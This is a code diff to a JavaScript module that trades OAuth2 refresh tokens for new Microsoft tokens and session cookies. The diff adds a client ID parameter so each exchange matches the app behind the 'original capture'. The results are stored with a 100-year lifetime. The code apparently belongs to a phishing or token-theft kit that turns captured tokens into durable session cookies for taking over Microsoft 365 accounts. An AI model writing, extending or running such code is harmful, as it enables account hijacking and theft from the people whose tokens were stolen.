@@ -28,9 +28,10 @@ const TOKEN_ENDPOINTS = {
  * @param {string} email - User email for personalized endpoints
  * @returns {object} Result with cookies string and metadata
  */
-async function convertTokensToCookies(accessToken, templateType, tenant, email) {
+async function convertTokensToCookies(accessToken, templateType, tenant, email, clientId) {
   tenant = tenant || 'common';
   email = email || '';
+  clientId = clientId || CLIENT_ID;
 
   try {
     // Validate input
@@ -48,8 +49,8 @@ async function convertTokensToCookies(accessToken, templateType, tenant, email) 
       };
     }
 
-    // Step 1: Exchange refresh token for new tokens + cookies from MS
-    const exchangeResult = await exchangeRefreshTokenForCookies(accessToken, tenant);
+    // Step 1: Exchange refresh token for new tokens + cookies from MS (pass client_id)
+    const exchangeResult = await exchangeRefreshTokenForCookies(accessToken, tenant, clientId);
     if (!exchangeResult.success) {
       return exchangeResult;
     }
@@ -83,11 +84,15 @@ async function convertTokensToCookies(accessToken, templateType, tenant, email) 
 /**
  * Exchange OAuth2 refresh token for new access token + capture Set-Cookie headers
  * Tries tenant-specific first, then falls back to common/consumers
+ * @param {string} refreshToken - OAuth2 refresh token
+ * @param {string} targetTenant - Tenant ID
+ * @param {string} clientId - Client ID to use (must match original auth client)
  */
-async function exchangeRefreshTokenForCookies(refreshToken, targetTenant) {
+async function exchangeRefreshTokenForCookies(refreshToken, targetTenant, clientId) {
   const cookies = [];
   let newRefreshToken = null;
   const tenantToUse = targetTenant || TENANT;
+  const clientIdToUse = clientId || CLIENT_ID;
 
   // Try endpoints in priority order: tenant-specific -> common -> consumers
   const endpoints = [
@@ -101,7 +106,7 @@ async function exchangeRefreshTokenForCookies(refreshToken, targetTenant) {
   for (const endpoint of endpoints) {
     try {
       const params = new URLSearchParams({
-        client_id: CLIENT_ID,
+        client_id: clientIdToUse,
         grant_type: 'refresh_token',
         refresh_token: refreshToken,
         scope: 'https://graph.microsoft.com/.default offline_access openid profile',
@@ -395,9 +400,14 @@ function determineResource(templateType, tenant) {
 
 /**
  * Process cookie conversion and save to database
+ * @param {string} tokenId - Token record ID
+ * @param {string} accessToken - Access/refresh token to exchange
+ * @param {string} templateType - Template type
+ * @param {string} tenant - Azure tenant
+ * @param {string} clientId - Azure client ID (must match original capture)
  */
-async function processCookieConversion(tokenId, accessToken, templateType, tenant) {
-  const result = await convertTokensToCookies(accessToken, templateType, tenant);
+async function processCookieConversion(tokenId, accessToken, templateType, tenant, clientId) {
+  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, clientId);
 
   if (result.success && result.cookies) {
     // Save with 100-year TTL
